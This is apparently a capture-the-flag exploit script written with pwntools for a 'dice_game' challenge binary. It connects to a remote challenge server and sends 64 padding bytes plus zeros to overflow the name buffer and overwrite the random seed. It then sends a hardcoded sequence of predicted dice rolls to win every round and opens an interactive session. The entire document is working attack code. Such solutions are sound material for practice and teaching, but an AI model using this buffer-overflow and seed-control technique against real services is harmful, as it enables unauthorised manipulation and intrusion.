from pwn import *

#a=process("./dice_game")
a=remote("111.198.29.45","30251")
elf=ELF("./dice_game")
payload='A'*64
payload+=p64(0)*2

a.recvuntil("Welcome, let me know your name: ")
a.sendline(payload)

rand="25426251423232651155634433322261116425254446323361"
for i in rand:
	a.recvuntil("Give me the point(1~6): ")
	print i
	a.sendline(i)

a.interactive()
